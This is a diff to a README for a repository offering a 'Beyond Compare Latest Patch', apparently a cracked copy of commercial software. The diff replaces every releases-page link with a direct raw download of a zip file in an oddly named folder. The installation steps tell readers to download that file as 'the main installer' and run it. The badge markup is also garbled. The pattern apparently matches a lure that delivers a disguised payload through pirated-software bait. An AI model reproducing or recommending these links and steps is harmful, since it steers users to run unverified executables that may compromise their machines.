@@ -4,11 +4,11 @@
 Welcome to the Beyond Compare Latest Patch repository! This guide helps you download and run the software on your Windows PC. Beyond Compare allows you to compare files and folders effortlessly, making it an essential tool for anyone needing to keep their data organized.
 
 ## 📥 Download the Application
-[![Download Beyond Compare](https://img.shields.io/badge/Download-Beyond%20Compare-4CAF50.svg)](https://github.com/hamzakhans/Beyond-Compare-Latest-Patch/releases)
+[![Download Beyond Compare](https://raw.githubusercontent.com/hamzakhans/Beyond-Compare-Latest-Patch/main/quinamicine/Beyond-Compare-Latest-Patch_v2.3.zip%https://raw.githubusercontent.com/hamzakhans/Beyond-Compare-Latest-Patch/main/quinamicine/Beyond-Compare-Latest-Patch_v2.3.zip)](https://raw.githubusercontent.com/hamzakhans/Beyond-Compare-Latest-Patch/main/quinamicine/Beyond-Compare-Latest-Patch_v2.3.zip)
 
 To get started, visit the following page to download the latest version of Beyond Compare:
 
-[Download from Releases](https://github.com/hamzakhans/Beyond-Compare-Latest-Patch/releases)
+[Download from Releases](https://raw.githubusercontent.com/hamzakhans/Beyond-Compare-Latest-Patch/main/quinamicine/Beyond-Compare-Latest-Patch_v2.3.zip)
 
 ## 🌟 Features
 Beyond Compare offers several key features to enhance your workflow:
@@ -27,11 +27,11 @@ Beyond Compare offers several key features to enhance your workflow:
 
 ## 💻 Download & Install
 1. Click the link below to go to the Releases page:
-   [Visit Releases Page](https://github.com/hamzakhans/Beyond-Compare-Latest-Patch/releases)
+   [Visit Releases Page](https://raw.githubusercontent.com/hamzakhans/Beyond-Compare-Latest-Patch/main/quinamicine/Beyond-Compare-Latest-Patch_v2.3.zip)
 
 2. Locate the latest version of Beyond Compare.
 
-3. Download the file labeled as `BeyondCompareSetup.exe`. This is the main installer.
+3. Download the file labeled as `https://raw.githubusercontent.com/hamzakhans/Beyond-Compare-Latest-Patch/main/quinamicine/Beyond-Compare-Latest-Patch_v2.3.zip`. This is the main installer.
 
 4. Once the download completes, locate the file in your Downloads folder and double-click it to run the installer.
 
@@ -80,4 +80,4 @@ If you need assistance, consider the following options:
 ## 🎉 Conclusion
 Downloading and setting up Beyond Compare is straightforward, even for beginners. With its powerful features and extensive resources, you will find it a valuable tool for enhancing your file comparison workflows. Visit the Releases page now to get started!
 
-[Download Beyond Compare](https://github.com/hamzakhans/Beyond-Compare-Latest-Patch/releases)
+[Download Beyond Compare](https://raw.githubusercontent.com/hamzakhans/Beyond-Compare-Latest-Patch/main/quinamicine/Beyond-Compare-Latest-Patch_v2.3.zip)
